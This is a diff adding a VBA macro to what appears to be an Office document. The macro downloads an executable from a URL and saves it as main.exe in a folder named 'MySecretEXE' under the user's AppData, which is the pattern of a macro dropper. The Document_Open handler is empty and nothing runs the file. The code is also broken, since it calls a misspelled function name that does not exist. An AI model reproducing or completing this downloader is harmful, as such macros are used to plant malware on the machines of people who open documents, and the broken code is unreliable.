@@ -1,0 +1,44 @@
+Private Sub Document_Open()
+     
+     
+End Sub
+
+
+Public Function DownloadFile()
+
+Dim myURL As String
+ Dim strPath As String
+ strPath = Environ("APPDATA")
+myURL = "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-602.exe"
+
+Dim WinHttpReq As Object
+Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
+WinHttpReq.Open "GET", myURL, False, "username", "password"
+WinHttpReq.send
+
+If WinHttpReq.Status = 200 Then
+    Set oStream = CreateObject("ADODB.Stream")
+    oStream.Open
+    oStream.Type = 1
+    oStream.Write WinHttpReq.responseBody
+    CheckFoledrExist
+    oStream.SaveToFile strPath & "\\MySecretEXE\\main.exe", 2 ' 1 = no overwrite, 2 = overwrite
+    oStream.Close
+End If
+End Function
+
+Public Function CheckFolderExist()
+Dim strFolderName As String
+Dim strFolderExists As String
+ Dim strPath As String
+ strPath = Environ("APPDATA")
+    strFolderName = strPath & "\\MySecretEXE"
+    strFolderExists = Dir(strFolderName, vbDirectory)
+ 
+    If strFolderExists = "" Then
+        
+        MkDir strPath & "\\MySecretEXE"
+    End If
+    
+    
+End Function
